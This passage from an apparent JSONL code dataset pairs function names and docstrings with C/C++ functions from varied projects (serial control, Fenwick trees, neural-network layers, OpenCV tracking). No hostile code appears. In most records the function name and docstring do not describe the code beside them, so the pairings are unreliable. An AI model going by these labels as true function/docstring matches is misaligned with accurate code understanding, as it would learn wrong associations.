};\\n  \/\/ Counters should all be zero on creation.\\n  assert_counters(0, 0, \"initial zeroes\");\\n\\n  \/\/ Return a single descriptor and assert the counters.\\n  {\\n    std::unique_ptr<RxReturn> buffer = prepare_return_buffer();\\n    ASSERT_TRUE(buffer);\\n    RxReturnTransaction txn(&impl_);\\n    txn.Enqueue(std::move(buffer));\\n    txn.Commit();\\n  }\\n  assert_counters(1, kReturnLength, \"single buffer\");\\n\\n  \/\/ Return all the remaining descriptors and assert the counters.\\n  {\\n    RxReturnTransaction txn(&impl_);\\n    for (size_t i = 1; i < std::size(kDescriptors); i++) {\\n      std::unique_ptr<RxReturn> buffer = prepare_return_buffer();\\n      ASSERT_TRUE(buffer);\\n      txn.Enqueue(std::move(buffer));\\n    }\\n    txn.Commit();\\n  }\\n  assert_counters(std::size(kDescriptors), std::size(kDescriptors) * kReturnLength,\\n                  \"remaining buffers\");\\n}'}","id":3938}
{"content":"{'function_name': 'display', 'docstring': '\/\/ enough for the image to persist', 'code': 'int serialcontrol(char msg[4][32], byte msgbits[7][20][4]) {\\n    if (!Serial.available()) {\\n        Particle.publish(\"serial_control\",\"no serial\");\\n        return 0;\\n    }\\n\\n    bool error = true;\\n    int linechar = 0;\\n    int lineinx = 0;\\n    int i;\\n\\n    int cmd = Serial.read(); \/\/ read the command byte\\n\\n    \/\/Serial.write((char)(cmd));\\n    \/\/Serial.write(\"\\\\n\\\\r\");\\n\\n    switch(cmd) {\\n    case HELP_CMD:\\n        Serial.write(help_msg);\\n        error = false;\\n        break;\\n    case READ_CMD:\\n        for (i=0; i<4; i++) {\\n            Serial.write((const uint8_t *)(msg[i]), 32);\\n            Serial.write(\"\\\\r\\\\n\");\\n        }\\n        error = false;\\n        break;\\n    case SETLINE_CMD:\\n        Serial.write(\"type line number (1 - 4):\\\\r\\\\n\");\\n    getline:\\n        linechar = Serial.read(); \/\/ read the line number\\n        if (linechar == -1) goto getline;\\n        lineinx = linechar - \\'1\\';\\n        \/\/flushtonewline();\\n        if (lineinx < 0 || lineinx > 3) {\\n            flushtonewline();\\n            Serial.write(\"invalid line number\\\\r\\\\n\");\\n            error = true;\\n        } else {\\n            Serial.write(\"type line data (will truncate to 32 chars):\\\\r\\\\n\");\\n            error = readmsglinedata(msg[lineinx]);\\n            rendermsgbits(msg, msgbits);\\n            \/\/Serial.write(\"done with rendermsgbits\\\\r\\\\n\");\\n            error = false;\\n        }\\n        break;\\n    case SETTMPMSG_CMD:\\n    case SETPIXELS_CMD:\\n    case SETFONT_CMD:\\n        Serial.write(\"unimplemented command\\\\r\\\\n\");\\n        error = true;\\n        break;\\n    default:\\n        Serial.write(\"unkown command\\\\r\\\\n\");\\n        error = true;\\n        break;\\n    }\\n\\n    if (error) {\\n        Serial.write(\"ERROR\\\\r\\\\n\");\\n    } else {\\n        Serial.write(\"OK\\\\r\\\\n\");\\n    }\\n\\n    flushserial();\\n    return error;\\n}'}","id":3940}
{"content":"{'function_name': 'update', 'docstring': '\/\/\u66f4\u65b0\u6811\u72b6\u6570\u7ec4', 'code': 'int getsum(int x) { \/\/\u901a\u8fc7\u6811\u72b6\u6570\u7ec4\u8ba1\u7b97\u539f\u6570\u7ec4\u524dx\u9879\u548c\uff0c\u8fd9\u91cc\u5373\u4e3a\u5c0f\u4e8e\u7b49\u4e8eh[i]\u7684\u6570\u636e\u4e2a\u6570\\n\\tint sum=0;\\n\\twhile(x > 0) {\\n\\t\\tsum+=tree[x];\\n\\t\\tx-=lowbit(x);\\n\\t}\\n\\treturn sum;\\n}'}","id":3957}
{"content":"{'function_name': 'eval_OSR', 'docstring': '\/* \u041f\u0440\u043e\u0446\u0435\u0434\u0443\u0440\u0430 \u0434\u043b\u044f \u0440\u0430\u0441\u0441\u0447\u0435\u0442\u0430 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f OSR \u0434\u043b\u044f \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u0439 \u0447\u0430\u0441\u0442\u043e\u0442\u044b\\n     * \u041f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b:\\n     *   fx - \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0447\u0430\u0441\u0442\u043e\u0442\u044b \u0432 \u0413\u0446\\n     * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n     *   \u0417\u043d\u0430\u0447\u0435\u043d\u0438\u0435 OSR, \u0441\u043e\u043e\u0442\u0432. \u0434\u0430\u043d\u043d\u043e\u0439 \u0447\u0430\u0441\u0442\u043e\u0442\u0435.\\n     *\/', 'code': 'static int eval_parity\\n    (\\n    DWORD cmd\\n    )\\n    {\\n\\n    \/*\\n    * \u0412\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0435 \u0447\u0435\u0442\u043d\u043e\u0441\u0442\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u044b\\n    * \u041e\u041f\u0418\u0421\u0410\u041d\u0418\u0415\\n    *   \u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u0442 \u0431\u0438\u0442 \u0447\u0435\u0442\u043d\u043e\u0441\u0442\u0438 \u0434\u043b\u044f \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u043f\u043e \u0431\u0438\u0442\u0430\u043c 22-0 \u0434\u043b\u044f \u043a\u043e\u043d\u0442\u0440\u043e\u043b\u044f \u0447\u0435\u0442\u043d\u043e\u0441\u0442\u0438 \\n    * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n    *   cmd - \u043a\u043e\u043c\u0430\u043d\u0434\u0430;\\n    * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n    *   \u0447\u0435\u0442\u043d\u043e\u0441\u0442\u044c (0 \u0438\u043b\u0438 1)\\n    *\/\\n    unsigned long index;\\n    int parity;\\n\\n    parity = 0;\\n    for (index = 0x01UL; (index <= 0x10UL); index <<= 1)\\n        {\\n        parity ^= (cmd & index) != 0;\\n        }\\n\\n    for (index = 0x80000000UL; (index >= 0x010000UL); index >>= 1)\\n        {\\n        parity ^= (cmd & index) != 0;\\n        }\\n    return parity;\\n    }'}","id":3962}
{"content":"{'function_name': 'MyTrace', 'docstring': '\/\/ was there an error? was the expanded string too long?', 'code': 'int AFX_CDECL MySnprintf(PRT_TYPE prtType, char* pStr, int strSize, LPCTSTR lpszFormat, ...)\\n{\\n#ifdef _DEBUG \/\/ all AfxTrace output is controlled by afxTraceEnabled\\n\\tif (!afxTraceEnabled)\\n\\t\\treturn (-1);\\n#endif\\n\\tWORD  bitMask = 0x01 << prtType;\\n\\tif (!(g_wPrintState & bitMask)) \/\/ check print bit_mask\\n\\t{\\n\\t\\treturn (-1);\\n\\t}\\n\\n\\tva_list args;\\n\\tva_start(args, lpszFormat);\\n\\n\\tint nBuf = _vsnprintf((char*)pStr, strSize, lpszFormat, args);\\n\\n\\t\/\/ was there an error? was the expanded string too long?\\n\\tASSERT(nBuf >= 0);\\n\\n\\tva_end(args);\\n\\n\\treturn nBuf;\\n}'}","id":3966}
{"content":"{'function_name': 'radio_finalize', 'docstring': '\/\/*ds_ptx = nullptr;', 'code': 'void radio_emit_signal(WrenVM* vm) {\\n\\tDecoratedRadio** radio_ptx = (DecoratedRadio**)wrenGetSlotForeign(vm, 0);\\n\\tif (*radio_ptx == nullptr) return;\\n\\n\\tstd::string signal_name = std::string(wrenGetSlotString(vm, 1));\\n\\tvoid* content = nullptr;  \/\/ Get extra through list\\n\\t\\n\\t(*radio_ptx)->emit_signal(signal_name, content);\\n}'}","id":3967}
{"content":"{'function_name': 'STAHLSOFT_HRX_TRY', 'docstring': '\/\/ Get the file path.\\r', 'code': 'STAHLSOFT_HRX_TRY(hr)\\r\\n\\t{\\r\\n\\t\\tif(lpszName == NULL)\\r\\n\\t\\t\\treturn dwDefaultVal;\\r\\n\\r\\n\\t\\t\/\/ Setup key name\\r\\n\\t\\tchar szName[33] = {0};\\r\\n\\r\\n\\t\\tif(bUserName)\\r\\n\\t\\t{\\r\\n\\t\\t\\t\/\/ Check length of name. It must be less than 11 characters.\\r\\n\\t\\t\\t\/\/ full_name (<=32 chars) = user_name (<=20 chars) + \":\" +  value_name (<=11 chars)\\r\\n\\t\\t\\tif(strlen(lpszName) > 11)\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\tCCTRACEE(_T(\"%s length exceeds 11 characters!!!, return default value\"), lpszName);\\r\\n\\t\\t\\t\\treturn dwDefaultVal;\\r\\n\\t\\t\\t}\\r\\n\\r\\n\\t\\t\\tif(*g_szUserName == _T(\\'\\\\0\\'))\\r\\n\\t\\t\\t\\t_GetUserName();\\r\\n\\r\\n\\t\\t\\tsprintf(szName, \"%s:%s\", lpszName, CT2CA(g_szUserName));\\r\\n\\t\\t}\\r\\n\\t\\telse\\r\\n\\t\\t{\\r\\n\\t\\t\\tstrcpy(szName, lpszName);\\t\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tif(*g_szAlertFile == _T(\\'\\\\0\\'))\\r\\n\\t\\t\\t_GetAlertDataFile();\\r\\n\\r\\n\\t\\tCNAVOptFileEx alertFile;\\r\\n\\t\\thrx << (alertFile.Init(g_szAlertFile, FALSE) ? S_OK : E_FAIL);\\r\\n\\t\\talertFile.GetValue(szName, dwRetVal, dwDefaultVal);\\r\\n\\t}'}","id":3969}
{"content":"{'function_name': 'refine_interface2', 'docstring': '\/\/ std::cout<<\"the node of interface are \"<<p0<<\" and \"<<p1<<\". I search pm= \"<<pm<<\" in which phi = \"<<lm<<\" and ps1 e ps2 \"<<ps1<<\" and \"<<ps2<<\"equal to \"<<ls1<<\" , \"<<ls2<<std::endl;', 'code': 'typename cuthho_mesh<T, ET>::point_type\\nsearch_boundary( cuthho_mesh<T, ET>& msh, typename cuthho_mesh<T, ET>::cell_type& cl, typename cuthho_mesh<T, ET>::point_type& p_init ,T m , T q , T lm , const Function& level_set )\\n{\\n    typedef typename cuthho_mesh<T, ET>::point_type     point_type;\\n    auto pts = points(msh,cl);\\n    \\n    point_type pt_tmp0 = point_type( pts[0].x() , m* pts[0].x() + q ) ;\\n    point_type pt_tmp1 = point_type( pts[1].x() , m* pts[1].x() + q ) ;\\n    point_type pt_tmp2 = point_type( (pts[1].y()-q)\/m , pts[1].y() ) ;\\n    point_type pt_tmp3 = point_type( (pts[2].y()-q)\/m , pts[2].y() ) ;\\n    \/*\\n    if( offset(msh,cl) == 1029 || offset(msh,cl) == 1082 )\\n    {\\n        std::cout<<yellow<<bold<<\"search_boundary\"<<reset<<std::endl;\\n        std::cout<<\"pt_tmp0 = \"<<pt_tmp0<<std::endl;\\n        std::cout<<\"pt_tmp1 = \"<<pt_tmp1<<std::endl;\\n        std::cout<<\"pt_tmp2 = \"<<pt_tmp2<<std::endl;\\n        std::cout<<\"pt_tmp3 = \"<<pt_tmp3<<std::endl;\\n    }\\n    *\/\\n    auto ls0 = level_set(pt_tmp0,msh,cl);\\n    auto ls1 = level_set(pt_tmp1,msh,cl);\\n    auto ls2 = level_set(pt_tmp2,msh,cl);\\n    auto ls3 = level_set(pt_tmp3,msh,cl);\\n    \\n    if ( pt_in_cell(msh , pt_tmp0 , cl) && ( !((lm >= 0 && ls0 >= 0) || (lm < 0 && ls0 < 0)) ) )\\n        return pt_tmp0 ;\\n    if ( pt_in_cell(msh , pt_tmp1 , cl) && ( !((lm >= 0 && ls1 >= 0) || (lm < 0 && ls1 < 0)) ) )\\n    return pt_tmp1 ;\\n    if ( pt_in_cell(msh , pt_tmp2 , cl) && ( !((lm >= 0 && ls2 >= 0) || (lm < 0 && ls2 < 0)) ) )\\n    return pt_tmp2 ;\\n    if ( pt_in_cell(msh , pt_tmp3 , cl) && ( !((lm >= 0 && ls3 >= 0) || (lm < 0 && ls3 < 0)) ) )\\n    return pt_tmp3 ;\\n    else{\\n        std::cout<<\"In cell = \"<<offset(msh,cl)<<\" points(msh,cl)[0] = \"<<points(msh,cl)[0]<<\" points(msh,cl)[1] = \"<<points(msh,cl)[1]<<\" points(msh,cl)[2] = \"<<points(msh,cl)[2]<<\" points(msh,cl)[3] = \"<<points(msh,cl)[3] <<std::endl;\\n        std::cout<<\"m = \"<<m<<\" --> q = \"<<q<<std::endl;\\n        std::cout<<\"p_init = \"<<p_init<<\" --> pt_tmp0 = \"<<pt_tmp0<<\" , pt_tmp1 = \"<<pt_tmp1<<\" , pt_tmp2 = \"<<pt_tmp2<<\" , pt_tmp3 = \"<<pt_tmp3<<std::endl;\\n        std::cout<<\"ls0 = \"<<ls0<<\" , ls1 = \"<<ls1<<\" , ls2 = \"<<ls2<<\" , ls3 = \"<<ls3<<\" AND lm = \"<<lm<<std::endl;\\n        std::cout<<\"pt_in_cell( pt_tmp0 ) = \"<<pt_in_cell(msh , pt_tmp0 , cl)<<\" , pt_in_cell( pt_tmp1 ) = \"<<pt_in_cell(msh , pt_tmp1 , cl)<<\" , pt_in_cell( pt_tmp2 ) = \"<<pt_in_cell(msh , pt_tmp2 , cl)<<\" , pt_in_cel( pt_tmp3 ) = \"<<pt_in_cell(msh , pt_tmp3 , cl)<<std::endl;\\n        T pp = pts[0].x();\\n        T dist = std::abs( pp - p_init.x() )\/10.0;\\n        std::cout<<\"DIST = \"<<dist<< \" and pp = \"<<pp<< \" and p_init.x() = \"<<p_init.x() <<std::endl;\\n        point_type p0 = point_type( pp + dist , m* (pp-dist) + q ) ;\\n        point_type p1 = point_type( pp + (dist*2) , m* (pp+(dist*2)) + q ) ;\\n        point_type p2 = point_type( pp + (dist*3) , m* (pp+(dist*3)) + q ) ;\\n        point_type p3 = point_type( pp + (dist*4) , m* (pp+(dist*4)) + q ) ;\\n        point_type p4 = point_type( pp + (dist*5) , m* (pp+(dist*5)) + q ) ;\\n        point_type p5 = point_type( pp + (dist*6) , m* (pp+(dist*6)) + q ) ;\\n        point_type p6 = point_type( pp + (dist*7) , m* (pp+(dist*7)) + q ) ;\\n        point_type p7 = point_type( pp + (dist*8) , m* (pp+(dist*8)) + q ) ;\\n        point_type p8 = point_type( pp + (dist*9) , m* (pp+(dist*9)) + q ) ;\\n        std::cout<<\"p0 = \"<<p0<<\" , level_set = \"<<level_set(p0,msh,cl)<<\" , p1 = \"<<p1<<\" , level_set = \"<<level_set(p1,msh,cl)<<\" , p2 = \"<<p2<<\" , level_set = \"<<level_set(p2,msh,cl)<<\" , p3 = \"<<p3<<\" , level_set = \"<<level_set(p3,msh,cl)<<\" ,p4 = \"<<p4<<\" , level_set = \"<<level_set(p4,msh,cl)<<\" ,p5 = \"<<p5<<\" , level_set = \"<<level_set(p5,msh,cl)<<\" , p6 = \"<<p6<<\" , level_set = \"<<level_set(p6,msh,cl)<<\", p7 = \"<<p7<<\" , level_set = \"<<level_set(p7,msh,cl)<<\" , p8 = \"<<p8<<\" , level_set = \"<<level_set(p8,msh,cl)<<std::endl;\\n        \\n        \/\/throw std::logic_error(\"search_boundary not find -> Stefano\");\\n        \/\/return p_init ;\\n        \\n        point_type ret ;\\n        T val_min = 1e10;\\n        if( pt_in_cell(msh , pt_tmp0 , cl) && std::abs(ls0) < val_min )\\n        {\\n            val_min = std::abs(ls0) ;\\n            ret = pt_tmp0 ;\\n            \\n        }\\n        if( pt_in_cell(msh , pt_tmp1 , cl) && std::abs(ls1) < val_min )\\n        {\\n            val_min = std::abs(ls1) ;\\n            ret = pt_tmp1 ;\\n                \\n        }\\n        if( pt_in_cell(msh , pt_tmp2 , cl) && std::abs(ls2) < val_min )\\n        {\\n            val_min = std::abs(ls2) ;\\n            ret = pt_tmp2 ;\\n                \\n        }\\n        if( pt_in_cell(msh , pt_tmp3 , cl) && std::abs(ls3) < val_min )\\n        {\\n            val_min = std::abs(ls3) ;\\n            ret = pt_tmp3 ;\\n                \\n        }\\n        return ret;\\n            \\n    }\\n    \\n  \\n\\n}'}","id":3974}
{"content":"{'function_name': 'make_convolutional_layer', 'docstring': '\/\/l.update = update_convolutional_layer;', 'code': 'layer make_connected_layer(int batch, int inputs, int outputs, ACTIVATION activation, int batch_normalize, int adam, int index)\\n{\\n    int i;\\n    layer l;\\n    memset((void *)&l, 0, sizeof(layer));\\n    l.learning_rate_scale = 1;\\n    l.type = CONNECTED;\\n\\n    l.inputs = inputs;\\n    l.outputs = outputs;\\n    l.batch = batch;\\n    l.batch_normalize = batch_normalize;\\n    l.h = 1;\\n    l.w = 1;\\n    l.c = inputs;\\n    l.out_h = 1;\\n    l.out_w = 1;\\n    l.out_c = outputs;\\n\\n    l.output = (float *)calloc(batch*outputs, sizeof(float));\\n    l.delta = (float *)calloc(batch*outputs, sizeof(float));\\n\\n    l.weight_updates = (float *)calloc(inputs*outputs, sizeof(float));\\n    l.bias_updates = (float *)calloc(outputs, sizeof(float));\\n\\n    l.weights = (float *)calloc(outputs*inputs, sizeof(float));\\n    l.biases = (float *)calloc(outputs, sizeof(float));\\n\\n    \/\/l.forward = forward_connected_layer;\\n    \/\/l.backward = backward_connected_layer;\\n    \/\/l.update = update_connected_layer;\\n    l.forward = NULL;\\n    l.backward = NULL;\\n    l.update = NULL;\\n\\n    \/\/float scale = 1.\/sqrt(inputs);\\n    float scale = sqrt(2.\/inputs);\\n    for(i = 0; i < outputs*inputs; ++i){\\n        l.weights[i] = scale*rand_uniform(-1, 1);\\n    }\\n\\n    for(i = 0; i < outputs; ++i){\\n        l.biases[i] = 0;\\n    }\\n\\n    if(adam){\\n        l.m = (float *)calloc(l.inputs*l.outputs, sizeof(float));\\n        l.v = (float *)calloc(l.inputs*l.outputs, sizeof(float));\\n        l.bias_m = (float *)calloc(l.outputs, sizeof(float));\\n        l.scale_m = (float *)calloc(l.outputs, sizeof(float));\\n        l.bias_v = (float *)calloc(l.outputs, sizeof(float));\\n        l.scale_v = (float *)calloc(l.outputs, sizeof(float));\\n    }\\n    if(batch_normalize){\\n        l.scales = (float *)calloc(outputs, sizeof(float));\\n        l.scale_updates = (float *)calloc(outputs, sizeof(float));\\n        for(i = 0; i < outputs; ++i){\\n            l.scales[i] = 1;\\n        }\\n\\n        l.mean = (float *)calloc(outputs, sizeof(float));\\n        l.mean_delta = (float *)calloc(outputs, sizeof(float));\\n        l.variance = (float *)calloc(outputs, sizeof(float));\\n        l.variance_delta = (float *)calloc(outputs, sizeof(float));\\n\\n        l.rolling_mean = (float *)calloc(outputs, sizeof(float));\\n        l.rolling_variance = (float *)calloc(outputs, sizeof(float));\\n\\n        l.x = (float *)calloc(batch*outputs, sizeof(float));\\n        l.x_norm = (float *)calloc(batch*outputs, sizeof(float));\\n    }\\n\\n    l.activation = activation;\\n\\n    if(index >= global_start_index)\\n    {\\n        fprintf(stderr, \"connected_TA                         %4d  ->  %4d\\\\n\", inputs, outputs);\\n    }\\n    return l;\\n}'}","id":3978}
{"content":"{'function_name': 'main', 'docstring': '\/\/ 6.) rangsor kiexport\u00e1l\u00e1sa f\u00e1jlba', 'code': 'bool szamstring(const string &s) {\\n\\tstring::const_iterator it = s.begin();\\t\/\/ a main f\u00fcggv\u00e9nyb\u0151l kapott string v\u00e1ltoz\u00f3 \u00e9rt\u00e9k\u00e9b\u0151l iter\u00e1tort gener\u00e1l\\n\\twhile (it != s.end() && isdigit(*it)) {\\t\/\/ am\u00edg nem \u00e9rt\u00fcnk a string v\u00e9g\u00e9re, megn\u00e9zz\u00fck az iter\u00e1tor mem\u00f3riahely\u00e9n sz\u00e1mjegy van-e\\n\\t\\t++it;\\n\\t}\\n\\treturn !s.empty() && it == s.end();\\t\\t\/\/ ha nem \u00fcres a string, \u00e9s a v\u00e9g\u00e9re \u00e9rve is csak sz\u00e1mjegyet tal\u00e1ltunk: true, else false\\n}'}","id":3979}
{"content":"{'function_name': 'PDMR3ThreadSuspend', 'docstring': '\/*\\n     * Something failed, initialize termination.\\n     *\/', 'code': 'int pdmR3ThreadSuspendAll(PVM pVM)\\n{\\n    PUVM pUVM = pVM->pUVM;\\n    RTCritSectEnter(&pUVM->pdm.s.ListCritSect); \/* This may cause deadlocks later... *\/\\n    for (PPDMTHREAD pThread = pUVM->pdm.s.pThreads; pThread; pThread = pThread->Internal.s.pNext)\\n        switch (pThread->enmState)\\n        {\\n            case PDMTHREADSTATE_RUNNING:\\n            {\\n                int rc = PDMR3ThreadSuspend(pThread);\\n                AssertRCReturnStmt(rc, RTCritSectLeave(&pUVM->pdm.s.ListCritSect), rc);\\n                break;\\n            }\\n\\n            \/* suspend -> power off; voluntary suspend. *\/\\n            case PDMTHREADSTATE_SUSPENDED:\\n                break;\\n\\n            default:\\n                AssertMsgFailed((\"pThread=%p enmState=%d\\\\n\", pThread, pThread->enmState));\\n                break;\\n        }\\n    RTCritSectLeave(&pUVM->pdm.s.ListCritSect);\\n    return VINF_SUCCESS;\\n}'}","id":3982}
{"content":"{'function_name': 'OnDestroy', 'docstring': '\/\/ _WIN32', 'code': 'int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)\\n{\\n\\tint argc;\\n\\tstd::vector<std::vector<char>> argv;\\n\\n\\t\/\/ Use the CommandLine functions to get the command line arguments.\\n\\t\/\/ Unfortunately, Microsoft outputs\\n\\t\/\/ this information as wide characters for Unicode, and we simply want the\\n\\t\/\/ Ascii version to be compatible\\n\\t\/\/ with the non-Windows side.  So, we have to convert the information to\\n\\t\/\/ Ascii character strings.\\n\\tLPWSTR *commandLineArgs = CommandLineToArgvW(GetCommandLineW(), &argc);\\n\\tif (nullptr == commandLineArgs) argc = 0;\\n\\n\\tif (argc > 0)\\n\\t{\\n\\t\\targv.resize(argc);\\n\\t\\tassert(argv.data());\\n\\t\\tif (argv.size() == 0) argc = 0;\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tfor (int iii = 0; iii < argc; iii++)\\n\\t\\t\\t{\\n\\t\\t\\t\\tsize_t wideCharLen = wcslen(commandLineArgs[iii]);\\n\\t\\t\\t\\tsize_t numConverted = 0;\\n\\n\\t\\t\\t\\targv[iii].resize(wideCharLen + 1);\\n\\t\\t\\t\\tif (argv.size() > 0)\\n\\t\\t\\t\\t\\twcstombs_s(&numConverted, argv[iii].data(), wideCharLen + 1,\\n\\t\\t\\t\\t\\t\\tcommandLineArgs[iii], wideCharLen + 1);\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\t\/\/else argv = nullptr;\\n\\n\\tg_pDemo = make_unique<Demo>();\\n\\tg_pDemo->Init(XSVK::CreateContext(argc, argv.data()));\\n\\n\\tXSVK::InitWindow(\"Vulkan sample\", hInstance, 500u, 500u);\\n\\tXSVK::SetCreateCallback(OnCreate);\\n\\tXSVK::SetFrameMoveCallback(OnFrameMove);\\n\\tXSVK::SetFrameRenderCallback(OnFrameRender);\\n\\tXSVK::SetDestroyCallback(OnDestroy);\\n\\tXSVK::SetResizeCallback(OnResize);\\n\\n\\treturn XSVK::Loop();\\n}'}","id":3983}
{"content":"{'function_name': 'vec_subtraction', 'docstring': '\/\/vector_2 - vector_1\\r', 'code': 'vector<T> vec_addition(const vector<T>&vector_1, const vector<T>&vector_2)\\r\\n\/\/vector<float> vec_addition(const vector<float>&vector_1, const vector<float>&vector_2)\\r\\n{   \/\/compute vector addition\\r\\n    \/\/vector_1 + vector_2\\r\\n    vector<T> output((int)vector_1.size());\\r\\n    for(int i = 0 ; i < (int)output.size() ; i++)\\r\\n        output[i] = vector_2[i] + vector_1[i];\\r\\n    return output;\\r\\n}'}","id":3988}
{"content":"{'function_name': 'delete_world_annotation', 'docstring': '\/\/      cout << \"gis_database_ptr = \" << gis_database_ptr << endl;', 'code': 'bool insert_aircraft_metadata(\\n      gis_database* gis_database_ptr,\\n      int campaign_ID,int mission_ID,int frame_ID,\\n      double epoch_time,string frame_prefix,\\n      double longitude,double latitude,double altitude,\\n      double yaw,double pitch,double roll)\\n   {\\n\/\/      cout << \"inside databasefunc::insert_aircraft_metadata()\" << endl;\\n\\n      string curr_insert_command=\\n         databasefunc::generate_insert_aircraft_metadata_SQL_command(\\n            campaign_ID,mission_ID,frame_ID,\\n            epoch_time,frame_prefix,longitude,latitude,altitude,\\n            yaw,pitch,roll);\\n      \\n      vector<string> insert_commands;\\n      insert_commands.push_back(curr_insert_command);\\n      gis_database_ptr->set_SQL_commands(insert_commands);\\n\\n      return gis_database_ptr->execute_SQL_commands();\\n   }'}","id":3998}
{"content":"{'function_name': 'TopPlayerRectRefinement', 'docstring': '\/\/ correction so that the rectangle not exceed the frame size', 'code': 'std::vector<cv::Rect> BottomPlayerRectRefinement(std::vector<cv::Rect> inputrectangle, std::string filename) {\\n\\t\\tcv::VideoCapture stream(filename);\\n\\t\\tif (!stream.isOpened()) {\\n\\t\\t\\tstd::cerr << \"Unable to open video file: \" << filename << \" !\" << std::endl;\\n\\t\\t\\texit(EXIT_FAILURE);\\n\\t\\t}\\n\\n\\t\\t\/\/ grab the first frame\\n\\t\\tcv::Mat frame_rgb;\\n\\t\\tstream.read(frame_rgb);\\n\\n\\t\\tstd::vector<cv::Rect> outputrectangle;\\n\\n\\t\\tfor (size_t i = 0; i < inputrectangle.size(); i++) {\\n\\t\\t\\toutputrectangle.push_back(inputrectangle[i]);\\n\\t\\t}\\n\\n\\t\\t\/\/for (size_t i = 0; i < inputrectangle.size(); i++) {\\n\\t\\t\/\/\\t\/\/ Check and correct the x value\\n\\t\\t\/\/\\tif (inputrectangle[i].x == 0) {\\n\\t\\t\/\/\\t\\toutputrectangle[i].x = (int)(frame_rgb.cols \/ 2) - (int)(4.1 * frame_rgb.cols \/ 100);\\n\\t\\t\/\/\\t}\\n\\n\\t\\t\/\/\\t\/\/ Check and correct the y value\\n\\t\\t\/\/\\tif (inputrectangle[i].y == 0) {\\n\\t\\t\/\/\\t\\toutputrectangle[i].y = (int)(frame_rgb.rows \/ 2);\\n\\t\\t\/\/\\t}\\n\\n\\t\\t\/\/\\t\/\/ Check and correct the width value\\n\\t\\t\/\/\\tif (inputrectangle[i].width < (5.86 * frame_rgb.cols \/ 100) || inputrectangle[i].width >(19.91 * frame_rgb.cols \/ 100)) {\\n\\t\\t\/\/\\t\\toutputrectangle[i].width = (int)(15 * frame_rgb.cols \/ 100);\\n\\t\\t\/\/\\t}\\n\\n\\t\\t\/\/\\t\/\/ Check and correct the height value\\n\\t\\t\/\/\\tif (inputrectangle[i].height < (10.42 * frame_rgb.rows \/ 100) || inputrectangle[i].height >(35.42 * frame_rgb.rows \/ 100)) {\\n\\t\\t\/\/\\t\\toutputrectangle[i].height = (int)(26.25 * frame_rgb.rows \/ 100);\\n\\t\\t\/\/\\t}\\n\\t\\t\/\/}\\n\\n\\t\\t\/\/ Correction so that the rectangle not exceed the frame size\\n\\t\\tfor (size_t i = 0; i < outputrectangle.size(); i++) {\\n\\t\\t\\tif (frame_rgb.cols < outputrectangle[i].x + outputrectangle[i].width) {\\n\\t\\t\\t\\toutputrectangle[i].x = outputrectangle[i].x - ((outputrectangle[i].x + outputrectangle[i].width) - frame_rgb.cols);\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tfor (size_t i = 0; i < outputrectangle.size(); i++) {\\n\\t\\t\\tif (frame_rgb.rows < outputrectangle[i].y + outputrectangle[i].height) {\\n\\t\\t\\t\\toutputrectangle[i].y = outputrectangle[i].y - ((outputrectangle[i].y + outputrectangle[i].height) - frame_rgb.rows);\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\treturn outputrectangle;\\n\\t}'}","id":3999}
{"content":"{'function_name': 'BottomPlayerRectRefinement', 'docstring': '\/\/ Correction so that the rectangle not exceed the frame size', 'code': 'std::vector<cv::Vec8i> PositionsExtraction(std::string filename) {\\n\\t\\tcv::VideoCapture stream(filename);\\n\\t\\tif (!stream.isOpened()) {\\n\\t\\t\\tstd::cerr << \"Unable to open video file: \" << filename << \" !\" << std::endl;\\n\\t\\t\\texit(EXIT_FAILURE);\\n\\t\\t}\\n\\n\\t\\t\/\/ first frame\\n\\t\\tcv::Mat frame_rgb;\\n\\n\\t\\tstd::vector<cv::Rect> playersrect = PlayerRectExtraction(filename);\\n\\t\\tstd::vector<cv::Rect> topplayerrect;\\n\\t\\tstd::vector<cv::Rect> bottomplayerrect;\\n\\n\\t\\tfor (size_t i = 0; i < playersrect.size(); i += 2) {\\n\\t\\t\\ttopplayerrect.push_back(playersrect[i]);\\n\\t\\t\\tbottomplayerrect.push_back(playersrect[i + 1]);\\n\\t\\t}\\n\\n\\t\\tstd::vector<cv::Rect> rtopplayerrect = TopPlayerRectRefinement(topplayerrect, filename);\\n\\t\\tstd::vector<cv::Rect> rbottomplayerrect = BottomPlayerRectRefinement(bottomplayerrect, filename);\\n\\n\\t\\tstd::vector<cv::Vec8i> playerpositions;\\n\\n\\t\\tfor (size_t i = 0; i < rtopplayerrect.size(); i++) {\\n\\t\\t\\tint tx = rtopplayerrect[i].x;\\n\\t\\t\\tint ty = rtopplayerrect[i].y;\\n\\t\\t\\tint tw = rtopplayerrect[i].width;\\n\\t\\t\\tint th = rtopplayerrect[i].height;\\n\\t\\t\\tint bx = rbottomplayerrect[i].x;\\n\\t\\t\\tint by = rbottomplayerrect[i].y;\\n\\t\\t\\tint bw = rbottomplayerrect[i].width;\\n\\t\\t\\tint bh = rbottomplayerrect[i].height;\\n\\t\\t\\tplayerpositions.push_back(cv::Vec8i(tx, ty, tw, th, bx, by, bw, bh));\\n\\t\\t}\\n\\n\\t\\t\/\/ save the player detection and tracking result to a file\\n\\t\\tstd::ofstream ofs;\\n\\t\\tofs.open(\"results\/playerpositions.txt\");\\n\\t\\tfor (size_t i = 0; i < 